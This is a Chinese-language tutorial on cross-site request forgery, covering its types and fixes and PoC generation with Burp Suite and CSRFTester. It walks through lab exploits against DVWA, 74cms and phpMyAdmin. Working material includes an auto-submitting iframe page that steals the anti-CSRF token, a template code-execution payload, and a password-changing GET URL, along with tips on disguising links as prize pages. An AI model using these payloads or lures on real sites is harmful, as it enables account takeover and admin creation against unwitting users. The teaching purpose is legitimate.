本文由红日安全成员： Once 编写，如有不当，还望斧正。

大家好，我们是红日安全-Web安全攻防小组。此项目是关于Web安全的系列文章分享，还包含一个HTB靶场供大家练习，我们给这个项目起了一个名字叫 [**Web安全实战**](https://github.com/hongriSec/Web-Security-Attack) ，希望对想要学习Web安全的朋友们有所帮助。每一篇文章都是于基于**漏洞简介-漏洞原理-漏洞危害-测试方法（手工测试，工具测试）-靶场测试（分为PHP靶场、JAVA靶场、Python靶场基本上三种靶场全部涵盖）-实战演练（主要选择相应CMS或者是Vulnhub进行实战演练)**，如果对大家有帮助请**Star**鼓励我们创作更好文章。如果你愿意加入我们，一起完善这个项目，欢迎通过邮件形式（sec-redclub@qq.com）联系我们。

# 1.1 CSRF漏洞

# 1.1.1 CSRF漏洞简介

CSRF（跨站请求伪造），是指利用受害者尚未失效的身份认证信息（ cookie、会话
等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下
以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作
（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用

# 1.1.2 CSRF漏洞分类

## 1.1.2.1 GET型

GET型CSRF漏洞，只需要构造URL，然后诱导受害者访问利用。

## 1.1.2.2 POST型

POST型CSRF漏洞，需要构造自动提交或点击提交的表单，然后诱导受害者访问或点击利用。

# 1.1.3 CSRF漏洞危害

未验证 Referer或者使用 Token 导致用户或者管理员可被 CSRF添加、修改、删除等操作

# 1.1.4 CSRF漏洞修复方案

1、添加随机token值，并验证。
2、验证Referer
3、关键请求使用验证码功能

# 1.2 CSRF漏洞利用

# 1.2.1 利用思路

寻找增删改的地方，构造HTML，修改HTML表单中某些参数，使用浏览器打开该HTML，点击提交表单后查看响应结果，看该操作是否成功执行。

# 1.2.2 工具使用

## 1.2.2.1 burpsuite

使用burpsuite中Engagement tools的Generate CSRF PoC模块
右击要csrf攻击的url，选择Generate CSRF POC模块
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100128-3eceb174-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100128-3eceb174-cb93-1.png)
然后就构造好了攻击脚本，value就是要修改成的密码
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100129-3f3bfcde-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100129-3f3bfcde-cb93-1.png)
Test in browser一般用于自己测试用
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100129-3f9e5712-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100129-3f9e5712-cb93-1.png)
然后点击copy
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100130-401d4a90-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100130-401d4a90-cb93-1.png)
然后用代理burpsuite的浏览器打开
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100131-407a6fe0-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100131-407a6fe0-cb93-1.png)
点击submit request即可修改成功密码
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100131-40d23946-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100131-40d23946-cb93-1.png)
Copy HTML 一般用于攻击其他人，复制下代码保存为HTML文档
可以简单修改个中奖页面，诱惑受害者点击
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100132-4126996e-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100132-4126996e-cb93-1.png)
[

[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100133-41fc8e8e-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100133-41fc8e8e-cb93-1.png)

## 1.2.2.2 CSRFTester

下载地址：https://www.owasp.org/index.php/File:CSRFTester-1.0.zip
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100134-425ed5da-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100134-425ed5da-cb93-1.png)
下载后点击run.bat
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100135-42ae7a4a-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100135-42ae7a4a-cb93-1.png)
正常打开，并监听8008端口，需要把浏览器代理设置为8008
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100135-4309547e-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100135-4309547e-cb93-1.png)
点击Start Recording，开启CSRFTester检测工作，我们这里抓添加管理员的数据包
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100136-43c05c50-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100136-43c05c50-cb93-1.png)
然后右击删除没用的数据包
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100137-4412208a-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100137-4412208a-cb93-1.png)
点击Generate HTML生成CSRF攻击脚本，我们这次添加test1账号
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100138-447ed9c8-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100138-447ed9c8-cb93-1.png)
打开此文件，成功添加账号
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100138-44f33070-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100138-44f33070-cb93-1.png)

# 1.2.2 CSRF漏洞利用实例之DVWA

### 1.2.2.1 安装步骤

[下载地址：https://codeload.github.com/ethicalhack3r/DVWA/zip/master](https://codeload.github.com/ethicalhack3r/DVWA/zip/master)
漏洞环境：windows、phpstudy
先把config目录下config.inc.php.dist文件名修改为config.inc.php，数据库密码修改为自己的。
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100139-453a0996-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100139-453a0996-cb93-1.png)
然后访问dvwa，因为csrf漏洞不涉及红色部分配置，直接创建即可
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100139-45903424-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100139-45903424-cb93-1.png)
创建成功，账号密码是admin/password
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100140-45d8b19a-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100140-45d8b19a-cb93-1.png)
这里可以调相应的安全等级
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100141-46b88bbc-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100141-46b88bbc-cb93-1.png)

### 1.2.2.2 low等级

从代码中可以看出未作任何防御，直接更改密码。

```
if( isset( $_GET[ 'Change' ] ) ) {
   // Get input
   $pass_new  = $_GET[ 'password_new' ];
   $pass_conf = $_GET[ 'password_conf' ];

   // Do the passwords match?
   if( $pass_new == $pass_conf ) {
      // They do!
      $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
      $pass_new = md5( $pass_new );

      // Update the database
      $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
      $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

      // Feedback for the user
      $html .= "<pre>Password Changed.</pre>";
   }
   else {
      // Issue with passwords matching
      $html .= "<pre>Passwords did not match.</pre>";
   }

   ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
```

先使用burpsuite进行抓修改密码的数据包
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100142-471e49a2-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100142-471e49a2-cb93-1.png)
再使用Generate CSRF PoC进行构造poc
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100143-477ce14c-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100143-477ce14c-cb93-1.png)
CSRF HTML中的代码是构造好的
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100143-47eebc04-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100143-47eebc04-cb93-1.png)
把构造好的代码复制出来，复制到自己创建的HTML文件里，value里的值是要修改成的密码。
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100144-48466512-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100144-48466512-cb93-1.png)
点击submit request即可修改
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100145-48a07ba6-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100145-48a07ba6-cb93-1.png)
修改成功
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100145-48f8ea8e-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100145-48f8ea8e-cb93-1.png)

### 1.2.2.3 medium等级

从代码中可以看出先检测referer是否包含主机名称，再进行更改密码。

```
if( isset( $_GET[ 'Change' ] ) ) {
   // Checks to see where the request came from
   if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
      // Get input
      $pass_new  = $_GET[ 'password_new' ];
      $pass_conf = $_GET[ 'password_conf' ];

      // Do the passwords match?
      if( $pass_new == $pass_conf ) {
         // They do!
         $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
         $pass_new = md5( $pass_new );

         // Update the database
         $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
         $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

         // Feedback for the user
         $html .= "<pre>Password Changed.</pre>";
      }
      else {
         // Issue with passwords matching
         $html .= "<pre>Passwords did not match.</pre>";
      }
   }
   else {
      // Didn't come from a trusted source
      $html .= "<pre>That request didn't look correct.</pre>";
   }

   ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
```

先看下phpinfo中SERVER_NAME是什么
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100146-4944e6dc-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100146-4944e6dc-cb93-1.png)
访问poc，并抓包修改referer，添加localhost进行绕过
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100146-49969df6-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100146-49969df6-cb93-1.png)
修改成功
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100131-40d23946-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100131-40d23946-cb93-1.png)

### 1.2.2.4 high等级

从代码可以看出增加了Anti-CSRF token机制，用户每次访问更改页面时，服务器都会返回一个随机token，向服务器发送请求时，并带上随机token，服务端接收的时候先对token进行检查是否正确，才会处理客户端请求。

```
if( isset( $_GET[ 'Change' ] ) ) {
   // Check Anti-CSRF token
   checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

   // Get input
   $pass_new  = $_GET[ 'password_new' ];
   $pass_conf = $_GET[ 'password_conf' ];

   // Do the passwords match?
   if( $pass_new == $pass_conf ) {
      // They do!
      $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
      $pass_new = md5( $pass_new );

      // Update the database
      $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
      $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

      // Feedback for the user
      $html .= "<pre>Password Changed.</pre>";
   }
   else {
      // Issue with passwords matching
      $html .= "<pre>Passwords did not match.</pre>";
   }

   ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
```

generateSessionToken();

要绕过Anti-CSRF token机制，首先要获取token，再使用这个token进行修改密码。
然后构造以下代码

```
<html>
<body>
<script type="text/javascript">
    function attack()
  {
   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;
  document.getElementById("transfer").submit(); 
  }

</script>
<iframe src="http://192.168.1.108/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">

</iframe>
<body onload="attack()">

  <form method="GET" id="transfer" action="http://192.168.1.108/dvwa/vulnerabilities/csrf">

   <input type="hidden" name="password_new" value="hongri">

    <input type="hidden" name="password_conf" value="hongri">

   <input type="hidden" name="user_token" value="">

  <input type="hidden" name="Change" value="Change">

   </form>

</body>
</html>
```

访问后就立即修改密码
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100147-4a4ff512-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100147-4a4ff512-cb93-1.png)

### 1.2.2.5 参考文章

https://www.freebuf.com/articles/web/118352.html

# 1.2.3 CSRF漏洞利用实例之骑士cms

### 1.2.3.1 安装步骤

骑士cms下载地址：http://www.74cms.com/download/load/id/155.html
漏洞环境：windows、phpstudy
存在漏洞：POS型CSRF、代码执行

下载解压，访问首页
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100148-4aa8ae64-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100148-4aa8ae64-cb93-1.png)
填写信息
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100149-4b0486a8-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100149-4b0486a8-cb93-1.png)
安装完成
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100149-4b55e444-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100149-4b55e444-cb93-1.png)

### 1.2.3.2 利用过程

安装好后，进入添加管理员界面进行抓包
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100150-4bb16210-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100150-4bb16210-cb93-1.png)
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100150-4c024a4a-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100150-4c024a4a-cb93-1.png)
使用Generate CSRF PoC生成HTML代码，并添加个中奖图片，简单伪装成中奖页面。
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100151-4c450754-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100151-4c450754-cb93-1.png)
还可以用短域名继续伪装
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100152-4cf8486e-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100152-4cf8486e-cb93-1.png)
然后诱导管理员打开并点击，创建成功
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100152-4d4e0420-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100152-4d4e0420-cb93-1.png)
使用创建的账号密码登录
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100153-4daf0f54-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100153-4daf0f54-cb93-1.png)
使用代码执行漏洞执行phpinfo
poc：index.php?m=Admin&c=Tpl&a=set&tpl_dir=a'.${phpinfo()}.'
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100154-4e0436d2-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100154-4e0436d2-cb93-1.png)

### 1.2.3.3 参考文章

http://www.yqxiaojunjie.com/index.php/archives/341/

# 1.2.4 CSRF漏洞利用实例之phpMyAdmin

### 1.2.4.1 安装步骤

此漏洞使用VulnSpy在线靶机
靶机地址：https://www.vulnspy.com/?u=pmasa-2017-9
存在漏洞：GET型CSRF
点击开启实验
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100154-4e5f6804-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100154-4e5f6804-cb93-1.png)
可以登录也可以不登录
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100155-4eb84d5c-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100155-4eb84d5c-cb93-1.png)
打开靶机地址，默认账号密码：root/toor，靶机只有十分钟的时间
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100155-4f1a2536-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100155-4f1a2536-cb93-1.png)

### 1.2.4.2 利用过程

将当前用户密码更改为hongri，SQL命令

```
SET passsword=PASSWORD('hongri');
```

构造poc

```
http://f1496b741e86dce4b2f79f3e839f977d.vsplate.me:19830/pma/sql.php?db=mysql&table=user&sql_query=SET%20password
%20=%20PASSWORD(%27hongri%27)
```

我们可以使用短域名伪装
[![img](https://xz.aliyun.com/t/6128)](https://xz.aliyun.com/t/6128)
修改成功
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/20190831100156-4f73a5de-cb93-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190831100156-4f73a5de-cb93-1.png)